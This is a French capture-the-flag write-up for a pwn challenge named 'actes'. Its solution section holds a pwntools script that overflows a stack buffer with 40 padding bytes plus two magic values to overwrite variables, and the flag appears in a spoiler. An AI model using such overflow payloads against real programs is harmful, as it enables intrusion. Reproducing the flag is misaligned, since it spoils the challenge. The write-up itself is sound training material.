## Enoncé

>Dans les récits anciens, il est dit que même les plus grands guerriers de Naori ne pouvaient triompher que s'ils combinaient force et finesse. Chaque acte devait être soigneusement exécuté, car le moindre faux pas pouvait les priver de leur victoire. Pour ceux qui souhaitent véritablement accéder aux secrets ultimes de l'île, une épreuve consistant à manipuler les forces à l'intérieur des sanctuaires les attend.
>
>Après avoir traversé des forêts denses et surmonté de nombreuses épreuves, vous arrivez devant un sanctuaire oublié, caché dans les entrailles de la montagne sacrée de Naori. À l'intérieur, une inscription gravée dans la pierre vous avertit :
>
>"Les actes que tu poseras ici détermineront ton destin. Ce n'est pas la force brute qui te fera triompher, mais la précision de tes actions."
>
>Devant vous se trouve un ancien dispositif de sécurité magique, une épreuve qui teste votre capacité à manipuler des forces invisibles, représentées ici par des variables mystiques. Pour réussir, vous devrez échanger les rôles de ces forces et prouver que vous êtes digne de poursuivre votre quête.

![actes](../../../../attachements/actes)
## Résolution


Definition du payload : 
```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or 'actes')

p = remote("challenges.hackagou.nc", 5002)

var_2 = p32(0xbeefc0de)  
var_1 = p32(0xdeadbabe)  
payload = b'A' * 40 + var_1 + var_2  

p.recvuntil(b'\n\n')
p.sendline(payload)
p.interactive()
```


>[!question]- Spoiler du flag
> OPENNC{13_Gu3rR13r_4g17_4v3c_54g35s3_3t_Br4v0uR3...}

